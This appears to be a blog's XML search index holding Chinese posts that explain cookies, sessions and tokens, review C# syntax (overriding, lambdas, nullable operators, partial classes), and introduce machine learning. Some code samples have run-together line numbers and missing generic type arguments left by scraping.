<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Rest API接口测试]]></title>
    <url>%2F2019%2F08%2F26%2FRest-API%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[]]></content>
  </entry>
  <entry>
    <title><![CDATA[彻底理解cookie session token]]></title>
    <url>%2F2019%2F08%2F26%2F%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3cookie-session-token%2F</url>
    <content type="text"><![CDATA[发展史 很久很久以前，Web 基本上就是文档的浏览而已， 既然是浏览，作为服务器， 不需要记录谁在某一段时间里都浏览了什么文档，每次请求都是一个新的HTTP协议， 就是请求加响应， 尤其是我不用记住是谁刚刚发了HTTP请求， 每个请求对我来说都是全新的。（嗨皮的时代） 但是随着交互式Web应用的兴起，像在线购物网站，需要登录的网站等等，马上就面临一个问题，那就是要管理会话，必须记住哪些人登录系统， 哪些人往自己的购物车中放商品， 也就是说我必须把每个人区分开，这就是一个不小的挑战，因为HTTP请求是无状态的，所以想出的办法就是给大家发一个会话标识(session id), 说白了就是一个随机的字串，每个人收到的都不一样， 每次大家向我发起HTTP请求的时候，把这个字符串给一并捎过来， 这样我就能区分开谁是谁了。 这样大家很嗨皮了，可是服务器就不嗨皮了，每个人只需要保存自己的session id，而服务器要保存所有人的session id ！如果访问服务器多了， 就得由成千上万，甚至几十万个。 但这对服务器说是一个巨大的开销 ， 严重的限制了服务器扩展能力， 比如说我用两个机器组成了一个集群， 小F通过机器A登录了系统， 那session id会保存在机器A上， 假设小F的下一次请求被转发到机器B怎么办？机器B可没有小F的 session id啊。 有时候会采用一点小伎俩： session sticky ， 就是让小F的请求一直粘连在机器A上， 但是这也不管用， 要是机器A挂掉了， 还得转到机器B去。 那么，就只好做一个session复制了，就是把session id 在两个机器之间搬来搬去。 后来有个叫Memcached的支了招：把session id 集中存储到一个地方， 所有的机器都来访问这个地方的数据， 这样一来，就不用复制了， 但是增加了单点失败的可能性， 要是那个负责session 的机器挂了， 所有人都得重新登录一遍， 估计得被人骂死。 也尝试把这个单点的机器也搞出集群，增加可靠性， 但不管如何， 这小小的session 是一个沉重的负担。 因此，有人就一直在思考，我为什么要保存这可恶的session呢， 只让每个客户端去保存该多好？ 可是如果不保存这些session id , 怎么验证客户端发给我的session id 的确是我生成的呢？ 如果不去验证，我们都不知道他们是不是合法登录的用户， 那些不怀好意的家伙们就可以伪造session id , 为所欲为了。 所以，关键点是在于验证。 比如说， 小F已经登录了系统， 我给他发一个令牌(token)， 里边包含了小F的 user id， 下一次小F 再次通过Http 请求访问我的时候， 把这个token 通过Http header 带过来不就可以了。 不过这和session id没有本质区别啊， 任何人都可以可以伪造， 所以我得想点儿办法， 让别人伪造不了。 那就是对数据做一个签名，比如说用HMAC-SHA256 算法，加上一个只有我才知道的密钥，对数据做一个签名， 把这个签名和数据一起作为token ， 由于密钥别人不知道， 就无法伪造token了。 这个token我不保存，我再用同样的HMAC-SHA256 算法和同样的密钥，对数据再计算一次签名，和token 中的签名做个比较， 如果相同， 我就知道小F已经登录过了，并且可以直接取到小F的user id , 如果不相同， 数据部分肯定被人篡改过， 我就告诉发送者：对不起，没有认证。 Token 中的数据是明文保存的（虽然我会用Base64做下编码， 但那不是加密）， 还是可以被别人看到的， 所以我不能在其中保存像密码这样的敏感信息。 当然， 如果一个人的token 被别人偷走了， 那我也没办法， 我也会认为小偷就是合法用户， 这其实和一个人的session id 被别人偷走是一样的。 这样一来， 我就不保存session id 了， 我只是生成token , 然后验证token ， 我用我的CPU计算时间获取了我的session 存储空间 ！ 解除了session id这个负担， 可以说是无事一身轻， 我的机器集群现在可以轻松地做水平扩展， 用户访问量增大， 直接加机器就行。这种无状态的感觉实在是太好了！ Cookiecookie 是一个非常具体的东西，指的就是浏览器里面能永久存储的一种数据，仅仅是浏览器实现的一种数据存储功能。 cookie由服务器生成，发送给浏览器，浏览器把cookie以kv形式保存到某个目录下的文本文件内，下一次请求同一网站时会把该cookie发送给服务器。由于cookie是存在客户端上的，所以浏览器加入了一些限制确保cookie不会被恶意使用，同时不会占据太多磁盘空间，所以每个域的cookie数量是有限的。 Sessionsession 从字面上讲，就是会话。这个就类似于你和一个人交谈，你怎么知道当前和你交谈的是张三而不是李四呢？对方肯定有某种特征（长相等）表明他就是张三。 session 也是类似的道理，服务器要知道当前发请求给自己的是谁。为了做这种区分，服务器就要给每个客户端分配不同的“身份标识”，然后客户端每次向服务器发请求的时候，都带上这个“身份标识”，服务器就知道这个请求来自于谁了。至于客户端怎么保存这个“身份标识”，可以有很多种方式，对于浏览器客户端，大家都默认采用 cookie 的方式。 服务器使用session把用户的信息临时保存在了服务器上，用户离开网站后session会被销毁。这种用户信息存储方式相对cookie来说更安全，可是session有一个缺陷：如果web服务器做了负载均衡，那么下一个操作请求到了另一台服务器的时候session会丢失。 Token在Web领域基于Token的身份验证随处可见。在大多数使用Web API的互联网公司中，tokens 是多用户下处理认证的最佳方式。 以下几点特性会让你在程序中使用基于Token的身份验证 无状态、可扩展 支持移动设备 跨程序调用 安全 那些使用基于Token的身份验证的大佬们 大部分你见到过的API和Web应用都使用tokens。例如Facebook, Twitter, Google+, GitHub等。 Token的起源在介绍基于Token的身份验证的原理与优势之前，不妨先看看之前的认证都是怎么做的。 基于服务器的验证我们都是知道HTTP协议是无状态的，这种无状态意味着程序需要验证每一次请求，从而辨别客户端的身份。 在这之前，程序都是通过在服务端存储的登录信息来辨别请求的。这种方式一般都是通过存储Session来完成。 随着Web，应用程序，已经移动端的兴起，这种验证的方式逐渐暴露出了问题。尤其是在可扩展性方面。 基于服务器验证方式暴露的一些问题 Seesion：每次认证用户发起请求时，服务器需要去创建一个记录来存储信息。当越来越多的用户发请求时，内存的开销也会不断增加。 可扩展性：在服务端的内存中使用Seesion存储登录信息，伴随而来的是可扩展性问题。 CORS(跨域资源共享)：当我们需要让数据跨多台移动设备上使用时，跨域资源的共享会是一个让人头疼的问题。在使用Ajax抓取另一个域的资源，就可以会出现禁止请求的情况。 CSRF(跨站请求伪造)：用户在访问银行网站时，他们很容易受到跨站请求伪造的攻击，并且能够被利用其访问其他的网站。 而在上述这些问题中，可扩展性是最突出的。因此我们有必要去寻求一种更有行之有效的方法。 4.1.2 基于Token的验证原理 基于Token的身份验证是无状态的，我们不将用户信息存在服务器或Session中。 这种概念解决了在服务端存储信息时的许多问题。 NoSession意味着你的程序可以根据需要去增减机器，而不用去担心用户是否登录。 基于Token的身份验证过程如下： 用户通过用户名和密码发送请求。 程序验证。 程序返回一个签名的token 给客户端。 客户端储存token,并且每次用于每次发送请求。 服务端验证token并返回数据。 每一次请求都需要token。token应该在HTTP的头部发送从而保证了Http请求无状态。我们同样通过设置服务器属性Access-Control-Allow-Origin:* ，让服务器能接受到来自所有域的请求。 需要注意的是，在ACAO头部标明(designating)*时，不得不带有像HTTP认证，客户端SSL证书和cookies的证书。 实现思路： 用户登录校验，校验成功后就返回Token给客户端。 客户端收到数据后保存在客户端 客户端每次访问API是携带Token到服务器端。 服务器端采用filter过滤器校验。校验成功则返回请求数据，校验失败则返回错误码 当我们在程序中认证了信息并取得token之后，我们便能通过这个Token做许多的事情。 我们甚至能基于创建一个基于权限的token传给第三方应用程序，这些第三方程序能够获取到我们的数据（当然只有在我们允许的特定的token） Token的优势无状态，可扩展在客户端存储的Tokens是无状态的，并且能够被扩展。基于这种无状态和不存储Session信息，负载均衡器能够将用户信息从一个服务传到其他服务器上。 如果我们将已验证的用户的信息保存在Session中，则每次请求都需要用户向已验证的服务器发送验证信息(称为Session亲和性)。用户量大时，可能会造成一些拥堵。 但是不要着急。使用tokens之后这些问题都迎刃而解，因为tokens自己hold住了用户的验证信息。 安全性请求中发送token而不再是发送cookie能够防止CSRF(跨站请求伪造)。即使在客户端使用cookie存储token，cookie也仅仅是一个存储机制而不是用于认证。不将信息存储在Session中，让我们少了对session操作。 token是有时效的，一段时间之后用户需要重新验证。我们也不一定需要等到token自动失效，token有撤回的操作，通过token revocataion可以使一个特定的token或是一组有相同认证的token无效。 可扩展性Tokens能够创建与其它程序共享权限的程序。例如，能将一个随便的社交帐号和自己的大号(Fackbook或是Twitter)联系起来。当通过服务登录Twitter(我们将这个过程Buffer)时，我们可以将这些Buffer附到Twitter的数据流上(we are allowing Buffer to post to our Twitter stream)。 使用tokens时，可以提供可选的权限给第三方应用程序。当用户想让另一个应用程序访问它们的数据，我们可以通过建立自己的API，得出特殊权限的tokens。 多平台跨域我们提前先来谈论一下CORS(跨域资源共享)，对应用程序和服务进行扩展的时候，需要介入各种各种的设备和应用程序。 1Having our API just serve data, we can also make the design choice to serve assets from a CDN. This eliminates the issues that CORS brings up after we set a quick header configuration for our application. 只要用户有一个通过了验证的token，数据和资源就能够在任何域上被请求到。 基于标准创建token的时候，你可以设定一些选项。我们在后续的文章中会进行更加详尽的描述，但是标准的用法会在JSON Web Tokens体现。 最近的程序和文档是供给JSON Web Tokens的。它支持众多的语言。这意味在未来的使用中你可以真正的转换你的认证机制。]]></content>
      <categories>
        <category>HTTP协议</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[C#语法回顾1]]></title>
    <url>%2F2019%2F08%2F26%2FC%23%E8%AF%AD%E6%B3%95%E5%9B%9E%E9%A1%BE1%2F</url>
    <content type="text"><![CDATA[C# 重载与重写基本定义构造函数： 构造函数是一种特殊的方法，主要用来创建对象时初始化对象，即为对象成员变量赋初始值，总与new运算符一起使用再创建对象的语句中。特别的一个类中可有多个构造函数，可根据其参数的不同或参数类型的不同开区分它们，即构造函数的重载。 重写： 当一个子类继承一个父类，而子类中的方法与父类中的方法的名称，参数个数，类型都完全一致时，就称子类中的这个方法重写了父类的方法。 重载： 一个类中的方法与另一个方法同名，但是其参数表不同，这种方法称之为重载方法。 实现方法重写： 通常，派生类继承基类的方法。因此，在调用对象继承方法的时候，调用和执行的是基类的实现。但是，有时需要对派生类中的继承方法有不同的实现。例如，假设动物类存在“跑”的方法，从中派生出马和狗，马和狗的跑得形态是各不相同的，因此同样方法需要两种不同的实现，这就需要”重新编写”基类中的方法。”重写”基类方法就是修改它的实现或者说在派生类中重新编写。 重载： 在一个类中用相同的名称但是不同的参数类型创建一个以上的过程、实例构造函数或属性。 区别 区别\ 名称 重载 重写 范围 同一个类 不同的类 方法名 相同 相同 参数列表 必须不同，与参数列表顺序无关 相同 修饰符 无关 大于父类方法 抛出父类没有的异常 可以 不可以 返回类型 不同 相同 与面向对象 多态 继承 重载特征： I.方法名必须相同 II.参数列表必须不相同，与参数列表的顺序无关 III.返回值类型可以不相同 用于在给定了参数列表和一组候选函数成员的情况下，选择一个最佳函数成员来实施调用。 重写特征： 重写就是子类重写父类的方法，在调用的时候，子类的方法会覆盖父类的方法，也就是会调用子类的方法。在父类中的方法必须有修饰符virtual，而在子类的方法中必须指明override； 发生方法重写的两个方法返回值，方法名，参数列表必须完全一致（必须具有相同的方法名和参数列表，返回值类型必须相同或者其子类）； 子类抛出的异常不能超过父类相应的方法抛出的异常； 子类方法的访问级别不能低于父类相应方法的访问级别（public，package，protected， private），不能缩小被重写方法的访问权限； 方法体不同。 重写格式： 123456789101112131415父类中： public virtual void myMethod(){ // *********} 子类中： public override void myMethod() { // *********} 重写以后，用父类对象和子类对象访问myMethod()方法，结果都是访问在子类中重新定义的方法，父类的方法相当于被覆盖掉了。 子类中为满足自己的需要来重复定义某个方法的不同实现。 通过使用override关键字来实现覆写。 只有虚方法和抽象方法才能被覆写。 要求（三相同）即相同的方法名称，相同的参数列表，相同的返回值类型。 表达式Lambda表达式 lambda表达式是一个匿名函数，用它可以简化代码，常常用做委托，回调； lambda表达式都使用运算符 => ,当见到这个符号，基本上是一个lambda表达式； lambda运算符的左边时输入参数(), => ,右边时表达式或语句块； lambda表达式，是可以访问到外部变量的，可以将此表达式分配给委托类型； Lambda运算符​ 为研究Lambda表达式，新建一个SimpleLambdaExpression的控制台应用程序。现在，考虑泛型List类型的FindAll()方法，此方法需要System.Predicate的泛型委托，它用于包装任何接受类型为T的输入参数并且返回布尔值的方法。在Program类型中增加一个方法，叫做TraditionalDelegateSyntax()，它与System.Predicate 类型交互，找出整数List中的偶数。 case1: 使用传统委托方式 1234567891011121314151617181920212223242526272829303132333435363738394041424344using System;using System.Collections.Generic;using System.Linq;using System.Text;using System.Threading.Tasks;namespace SimpleLambdaExpression{ class Program { static void Main(string[] args) { Console.WriteLine("**** Fun With Lambdas ****"); TraditionalDelegateSyntax(); Console.ReadLine(); } static void TraditionalDelegateSyntax() { // 创建整数列表 List list = new List(); list.AddRange(new int[] {20, 1, 4, 8, 9 , 44 }); // 使用传统委托语法调用FindAll() Predicate callback = new Predicate(IsEvenNumber); List evenNumbers = list.FindAll(callback); Console.WriteLine("Here are your even numbers:"); foreach (int evenNumber in evenNumbers) { Console.Write("{0} \t", evenNumber); } Console.WriteLine(); } // Predicate委托的目标 static bool IsEvenNumber(int i) { // 这是一个偶数吗？ return (i % 2) == 0; } }} 分析：以上代码可以按预期工作，但IsEvenNumber()方法只会在有限的环境中被调用，而且，如果调用FindAll()，就需要完整的方法定义。但如果用匿名方法来代替，代码就简洁许多。考虑下面Program类型的新方法。 Case2: Program类型的新方法 12345678910111213141516static void AnonymousMethodSyntax(){ // 建立整数列表 List list = new List(); list.AddRange(new int[] { 20, 1, 4, 8, 9, 44 }); // 现在使用匿名方法 List evenNumbers = list.FindAll(delegate(int i) { return (i % 2) == 0; }); Console.WriteLine("Here are your even numbers:"); foreach (int evenNumber in evenNumbers) { Console.Write("{0} \t", evenNumber); } Console.WriteLine();} 分析：以上的代码并不是首先创建一个Predicate委托类型，然后再编写一个独立方法，而是使用了一个匿名方法。这个方向是正确的，但是仍然需要使用关键字delegate（或者是一个强类型的Predicate），而且还需要保证输入参数是百分百匹配的。我们认为这样的，定义匿名方法的代码还是有些冗长。可以使用Lambda表达式进一步来简化方法FindAll()的调用，使用新的语法时，底层的委托语法将会消失得无影无踪，请看下面的代码： Case3：Lambda表达式 123456789101112131415static void LambdaExpessionSyntax(){ // 建立整数列表 List list = new List(); list.AddRange(new int[] { 20, 1, 4, 8, 9, 44 }); // 现在使用Lambda表达式 List evenNumbers = list.FindAll(i => (i % 2 == 0)); foreach (int evenNumber in evenNumbers) { Console.Write("{0} \t", evenNumber); } Console.WriteLine();} 我们将奇怪的语句传递给FindAll方法中，这些语句也就是Lambda表达式，这时候不需要用Predicate（或关键字delegate），而只用一个简单的lambda表达式即可。 在深入Lambda表达式之前，我们需要知道Lambda可以应用于任何匿名方法可以应用的场景，而且比匿名方法更节省编码时间。但实际上，C#编译器只是把表达式翻译成使用委托Predicate的普通匿名方法而已（可以使用isdasm.exe和reflector.ex进行验证），如下面的代码： 12345// Lambda表达式 List evenNumbers = list.FindAll(i => (i % 2 == 0));被编译进下面的C#代码：// 变成了匿名方法List evenNumbers = list.FindAll(delegate(int i) { return (i % 2) == 0; }); 剖析Lambda表达式Lambda形式可以理解为：Arguments ToProcess => StatementsToProcessThem List evenNumbers = list.FindAll(i => (i % 2 == 0)); // ‘ i ’是参数列表 // （i % 2 == 0）就是处理“i”的表达式 Lambda表达式的参数可以是显式类型化的也可以是隐式类型化的。现在，表示参数i的数据类型（整型）时隐式类型化的。编译器可以根据整个Lambda表达式的上下文和底层委托推断出i是一个整型。尽管如此，我们也可以显式定义表达式每一个参数的类型，如下用包围数据类型和变量即可： // 现在，显式的定义参数类型 List evenNumbers = list.FindAll((int i) => (i % 2 == 0)); 为保持风格一致，隐式还可以使用括号写成如下： List evenNumbers = list.FindAll((i) => (i % 2 == 0)); 多语句处理参数我们第一个Lambda表达式是一个求布尔类型值语句，但是我们知道很多委托目标需要执行多条代码执行，C#允许使用一系列的代码语句来定义Lambda表达式。当表达式必须使用多行代码处理参数时，你可以使用花括号限定范围。 123456789101112131415161718static void LambdaExpressionSyntax(){ // 创建整数列表 List list = new List(); list.AddRange(new int[] { 20, 1, 4, 8, 9, 44 }); // 现在使用语句块来编写Lambda表达式 List evenNumbers = list.FindAll((i) =>{ Console.WriteLine("value of i is currently: {0}",i); bool isEven = ((i % 2) == 0); return isEven; }); Console.WriteLine("Here are your even numbers:"); foreach (int evenNumber in evenNumbers) { Console.Write("{0} \t", evenNumber); }} 使用Lambda表达式重写CarDelegate示例推荐使用Lambda表达式是因为它为我们提供了一种简单明了的方式进行匿名函数的定义（由此间接地简化了关于委托的编码操作），以Lambda表达式重写CarDelegate示例，以下展示项目的Program类的简化版本，它使用传统的委托语法响应每一个回调： 123456789101112131415161718192021222324252627static void Main(string[] args){ Console.WriteLine("**** More Fun With Lambdas ****"); // 创建一个car对象 Car c1 = new Car("SlugBug", 100, 10); // 传统的委托语法 c1.OnAboutToBlow(new Car.AboutToBlow(CarAboutToBlow)); c1.OnExploded(new Car.Exploded(CarExploded)); // 加速（将会激发事件） Console.WriteLine("\n **** Speeding Up ****"); for(int i = 0; i < 6; i++) c1.SpeedUp(20); Console.ReadLine();}// 委托目标public static void CarAboutToBlow(string msg){ Console.WriteLine(msg);}public static void CarExploded(string msg){ Console.WriteLine(msg);} 用匿名方法重新写的Main(); 12345678910111213141516static void Main(string[] args){ Console.WriteLine("**** More Fun With Lambdas ****"); // 创建一个car对象 Car c1 = new Car("SlugBug", 100, 10); // 现在使用匿名方法 c1.OnAboutToBlow(delegate(string msg){ Console.WriteLine(msg);}); c1.OnExploded(delegate(string msg){ Console.WriteLine(msg);}); // 加速（将会激发事件） Console.WriteLine("\n **** Speeding Up ****"); for(int i = 0; i < 6; i++) c1.SpeedUp(20); Console.ReadLine();} 用Lambda表达式重写Main(); 12345678910111213141516static void Main(string[] args){ Console.WriteLine("**** More Fun With Lambdas ****"); // 创建一个car对象 Car c1 = new Car("SlugBug", 100, 10); // 现在使用匿名方法 c1.OnAboutToBlow(msg => { Console.WriteLine(msg);}); c1.OnExploded(msg => { Console.WriteLine(msg);}); // 加速（将会激发事件） Console.WriteLine("\n **** Speeding Up ****"); for(int i = 0; i < 6; i++) c1.SpeedUp(20); Console.ReadLine();} 含有多个（或零个）参数的Lambda表达式以上都是编写的Lambda表达式都只含有一个参数，实际上，Lambda表达式可以处理多个参数或者不提供任何参数，我们创建一个LambdaExpressionMultiplePrams来说明问题。假设SimpleMath有以下更新： 1234567891011121314151617181920212223242526272829303132public class SimpleMath{ public delegate void MathMessage(string msg, int result); private MathMessage mmDelegate; public delegate string VerySimpleDelegate(); // 处理多个参数的Lambda public void SetMathHandler(MathMessage target) { mmDelegate = target; } public void Add(int x, int y) { if (mmDelegate != null) { mmDelegate.Invoke("Adding has complete!", x + y); } } // 处理0个参数的Lambda public void SetZeroHandler() { VerySimpleDelegate v = new VerySimpleDelegate(() => { return "Enjoy your string"; }); Console.WriteLine(v.Invoke()); }} 我们可以看到，委托MathMessage需要两个参数，使用Lambda表达式的Main如下所示： 12345678910111213141516static void Main(string[] args){ // 使用Lambda表达式来注册委托 SimpleMath m = new SimpleMath(); m.SetMathHandler((msg, result) => { Console.WriteLine("Message: {0},Result: {1}", msg, result); }); // 执行Lambda表达式 m.Add(100, 10); m.SetZeroHandler(); Console.ReadLine();} ​ 这旨在让我们理解Lambda表达式的整体角色和它是如何以“函数方式”，匿名方法和委托状态共同工作的，尽管需要一些时间来适应新的Lambda表达式（=>）,不过要始终记住Lambda表达式可简化为：Arguments ToProcess => StatementsToProcessThem 的简单形式，并且在LINQ编程模型中使用了许多Lambda表达式来简化代码。 可空表达式 ？单问号 ？?: 单问号用于对 int,double,bool 等无法直接赋值为 null 的数据类型进行 null 的赋值，意思是这个数据类型是 NullAble 类型的。 123456int? i = 3 等同于Nullable i = new Nullable(3);int i; //默认值0int? ii; //默认值null 在此表达式出现之前，当我们得到一个对象并想使用这个对象，需判断该对象是否为null，否则使用对象时就会抛出NullReferenceException 异常（未将对象引用设置到对象的实例），如下例： 12345678910111213public static void Main(string[] args){ var user = GetUser(1); if(user == null) { //这里可以自定义 throw new NullReferenceException("指定的用户没有找到"); } //当 user 对象不是 null 时，我们才可以这样 var name = user.Name; var password = user.Password;} 现在使用可空表达式(?.)，作用就是当对象为null时，就不去访问后面点的对象，如下代码: 123456public static void Main(string [] args){ var user = GetUser(1); var name = user?.Name; var password = user?.PassWord;} ?.表达式将声明对象转换成了可为空类型 上面的代码时字符串，那如果时int类型又会是怎样？ int? age = user?.Age; 数据类型后面加一个问号，表示该类型可以是 null。你可以通过该对象的 HasValue 属性做一个判断，表示该对象有值，然后再使用该对象的 Value 属性获取到值。 12345int? age = user?.Age;if(age.HasValue){ Console.Write(age.value); } 再举一个例子： 1234567891011public event EventHandler OnEventChange; // 声明一个事件//...中间忽略//不使用可空表达式时if(OnEventChange != null) // 判断该时间是否被订阅{ OnEventChange();}//使用可空表达式OnEventChange?.Invoke(); 总结： 很明显可空表达式减少了一层判断，明显减少了我们的代码量，也提高了我们的效率。但是需要我们选择性使用，不要滥用。 双问号 ????: 双问号??可用于在判断一个变量在为null时返回一个指定的值， 具体来讲，??叫做null合并运算符，如果此运算符的左操作数不为 null，则此运算符将返回左操作数；否则返回右操作数。可以用来给变量设置默认值。特别提醒： 记住和空有关的时候，才要去用?? 。如果不会有空的判断，就别用了。因为这个是空的合并运算符。也有人说??是？：的语法糖而已，但是实际上？？进行了很大改进，能够更好的支持表达式。 12345678910111213141516171819using System;namespace CalculatorApplication{ class NullablesAtShow { static void Main(string[] args) { double? num1 = null; double? num2 = 3.14157; double num3; num3 = num1 ?? 5.34; // num1 如果为空值则返回 5.34 Console.WriteLine("num3 的值： {0}", num3); num3 = num2 ?? 5.34; Console.WriteLine("num3 的值： {0}", num3); // 返回3.14157 Console.ReadLine(); } }} 还有这个例子： 12345678// 用??Func f = () => GetName() ?? "test2";// 不用两个??，写条件表达式Func f1 = () =>{ var temp = GetName(); return temp != null ? GetName():"test2";} 实际上，??在复合情形中，更好用。 还有如何把第一个表达式，用?和??进行合并。 var flag = tt == null ? 1: tt.Name C# 可空类型(Nullable)C#提供了一个特殊的数据类型， nullable 类型（可空类型）, 可空类型可以表示其基础值类型正常范围内的值，再加上一个 null 值。 例如，Nullable< Int32 >，读作”可空的 Int32”，可以被赋值为 -2,147,483,648 到 2,147,483,647 之间的任意值，也可以被赋值为 null 值。类似的，Nullable< bool > 变量可以被赋值为 true 或 false 或 null。 在处理数据库和其他包含可能未赋值的元素的数据类型时，将 null 赋值给数值类型或布尔型的功能特别有用。例如，数据库中的布尔型字段可以存储值 true 或 false，或者，该字段也可以未定义。 声明一个nullable类型（可空类型）的语法如下： ? = null; 下面的示例展示可空数据类型的用法： 123456int? num1 = null;int? num2 = 45;double? num3 = new double?();double? num4 = 3.14157;bool? boolval = new bool?(); // 空的布尔值 正则表达式基础学习参见菜鸟教程 正则表达式 Partial class说明partial class基础C# 2.0就可以将类，结构或接口的定义分拆到两个或多个源文件中，在类声明前添加partial关键字即可。 例如：下面的PartialTest类 123456789class PartialTest{ string Str_FieldTest; int Int_FieldTest; public void DoTest() { Debug.Print("Test"); }} 可在不同的源文件中拆写成下面形式： 12345partial class PartialTest{ string Str_FieldTest; int Int_FieldTest;} 另一个文件中写： 1234567partial class PartialTest{ public void DoTest() { Debug.Print("Test"); }} 什么情况下使用分部类 处理大型项目时，使一个类分布于多个独立文件中可以让多位程序员同时对该类进行处理（相当于支持并行处理，很实用）； 使用自动生成的源时，无需重新创建源文件便可把代码添加到类中。可以观察到Visual Studio在创建Windows窗体，Web窗体都使用此方法。你不用编辑Visual Studio所创建的文件，便可创建使用这些类的代码。换句话说：系统会自动创建一个文件（一般记录的是窗体及窗体中的控件的属性），另一个或几个文件记录的是用户自己编写的代码。这两部分分开可以使结构显得非常清晰，用户只需关注自己负责的那部分就行了（需要的话，这两部分可以互相调用）。等到了编辑运行的时候，系统会自动将这两部分合成一个文件。 使用Partial需要注意以下情况 使用partial关键字表明可在命名空间内定义该类，结构或接口的其他部分； 所有部分都必须使用partial关键字； 各个部分必须具有相同的可访问性，如public，private等； 如果任意部分声明为抽象的，则整个类型都被视为抽象的； 如果将任意部分声明为密封的，则整个类型都被视为密封的； 如果任意部分声明继承基类时，则整个类型都将继承该类； 各个部分可以指定不同的基接口，最终类型将实现所有分部声明所列出的全部接口； 在某一分部定义中声明的任何类、结构或接口成员可供所有其他部分使用； 嵌套类型可以是分部的，即使它们所嵌套于的类型本身并不是分部的也如此。如下所示： 1234567891011class Container{ partial class Nested { void Test1(); } partial class Nested { void Test2(); }} 使用分部类的一些限制 要作为同一类型的各个部分的所有分部类型定义都必须使用partial 进行修饰。如下所示： 12public partial class A { }public class A { } // Error, must also be marked partial partial 修饰符只能出现在紧靠关键字class、struct 或interface前面的位置(枚举或其它类型都不能使用partial)； 要成为同一类型的各个部分的所有分部类型定义都必须在同一程序集和同一模块（.exe 或.dll 文件）中进行定义。分部定义不能跨越多个模块； 类名和泛型类型参数在所有的分部类型定义中都必须匹配。泛型类型可以是分部的。每个分部声明都必须以相同的顺序使用相同的参数名。 partial class扩展功能新思路开闭原则：“对修改封闭，对扩展开放”。在面向对象的系统中，通过类的继承实现扩展。.net中提供的partial class提供了扩展类的新思路。 应用场景 可以使用partial class的场景很多。这里分析一个ORM的例子。 系统中有一个Cat类，属性ID、Age、Weight都需要存储到数据库中，一个信息系统中常见的需求。通过读取数据库的结构，可以用工具生成Cat类的代码。并且ORM框架支持了从数据库信息生成Cat对象。 现在的Cat什么动作都没有，客户说，我们需要一个Miaow()的函数。这时就需要对ORM生成的Cat类进行扩展了。 可以肯定地一点是，我们不能修改自动生成的代码，因为这会牵涉到数据库结构与代码同步的问题。解决这个需求有两种方法：继承方式扩展，partial class扩展。 继承方式扩展 工具自动生成一个CatBase类，这个类只有属性，嵌入到ORM框架中。既然需要扩展功能，很容易想到对这个基类继承，于是有了Cat类。Cat类如愿以偿地有了Miaow()函数。 以前系统中用的是CatBase的实例，现在创建CatBase实例的地方需要改为创建Cat的实例。这个问题让ORM框架解决吧。 客户的需求实现了，我们自己的代码生成也没有遭到破坏，任务完成。 partial class扩展 partial class简单地说就是可以将一个类的代码写到两个或多个代码文件中。编译器在编译的过程中将这几个文件组合起来一起编译。一个很酷的技术。 工具生成的Cat类仍然不变。既然需要增加函数，那么在新建一个代码文件，将Miaow()函数写出来就可以。需要做的仅仅是将类的声明由class改为partial class，任务完成。 对比分析 两种思路都可以实现需求。孰优孰劣需要仔细分析一下。 实例创建：partial class更加简洁。 系统复杂度：对于系统来说，partial class方式下只存在一个类，而继承方式有两个类。 继承逻辑：从逻辑上讲，Cat并不需要一个基类CatBase，这样做仅仅是因为在代码构建过程中的一个限制。 维护性：两种方式下都会存在两个代码文件，维护成本并没有区别。 可读性：两个Cat文件确实让人费解。 整体上说，使用partial class方式的代码编写会更优雅一些。 “继承”的这种方式比较符合传统的思维习惯，而partial class到底是不是满足开闭原则呢，这点确实不好说。不过在软件构建上，我是一个实用主义者，哪种方式好用就用哪一种。 在ORM的场景中，partial class更加好一些，但有的时候，两个类之间确实就存在继承关系，那么就必须用到继承了。虽然绝大多数情况下，都需要继承方式，但是既然有了partial class技术，我们在做设计时也需要考虑这个思路。 可以看到在VS，Form，Dataset中都使用了partial class方式，原理和这个一样。但是要将这个原理推广到“业务实体”中，可能在理解上需要有所突破。 使用partial class确实会带来可读性的损失，尤其是一个类分布在很多个文件中的时候，所以文件的命名最好是有一个规范来保证。 参考资料 C#与.net3.5高级程序设计(第4版) C# 6.0语法 可空表达式 ? C# 基础知识之Partial]]></content>
      <categories>
        <category>C#</category>
      </categories>
      <tags>
        <tag>CSharp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初识机器学习]]></title>
    <url>%2F2019%2F08%2F17%2F%E5%88%9D%E8%AF%86%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[什么是机器学习什么是机器学习？机器学习指的是计算机对历史数据进行统计分析，找出规律，建立模型，最关键的是可以对未来不确定性场景进行判断和决策。 具体可见，什么是机器学习。 那什么是不确定性的场景呢？比如说太阳明天从什么地方升起，这就是确定的场景，因为永远都是从东方升起，从西方落下。但是下个季度的能完成多少业绩，这就是不确定的。 理解机器学习需要注意以下几个要点： 对历史数据的分析的主体是机器而不是人，这就与数据分析区别开了。 数据分析因为主体是人，所以能分析出什么很大程度取决于人的水平。而机器学习其实就是想撇开人的因素，完全使用机器来挖掘数据 需要大量的原材料，也就是数据 只有数据多了，能找出来的规律就越精准 找出了规律如何落地： 从数据中挖掘出来的规律，其实就是一个函数，我们可以把输入代进去，就可以得到输出。那机器挖掘出这个规律以后，会直接由机器生成代码。 从数据中寻找规律全量数据分析 人们从数据中寻找规律的历史已经非常长了，还建立了概率论和统计学两门学科。 在过去很长一段时间里面，因为受限于人类的计算能力，我们对数据一般会先采样，建立模型。但是因为是采样的，一定有样本的损失，所以一般来说会回过头去验证这个模型是否靠谱。 那我们来总结一下整个流程： 抽样——>描述统计——>结论——>假设检验 不过现在因为计算能力得到很大的提升，我们完全可以对全量的数据进行分析了。 从可视化到函数假设我们现在想分析美国某个地区的气温的情况，最直观的方法是把历史数据画一个图，可视化展示，这样就可以直观的了解其规律。 比如从上图这个散点图里面，我们可以发现如下规律： 这些年的气温总体是上升的 局部是上下波动的。 这种方法最大的好处是直观，缺点是没办法进行计算，所以我们需要进行量化。 那怎么使用模型来拟合规律呢？ 我们可以使用函数来拟合，然后通过函数画一条函数曲线。 我们希望这个函数曲线可以尽量的与之前的散点图拟合在一起。 机器学习发展的源动力机器学习在这几年得到蓬勃发展，其主要动力是： 从历史数据中找出规律，可以辅助未来决策。 用数据代替专家 数据变现 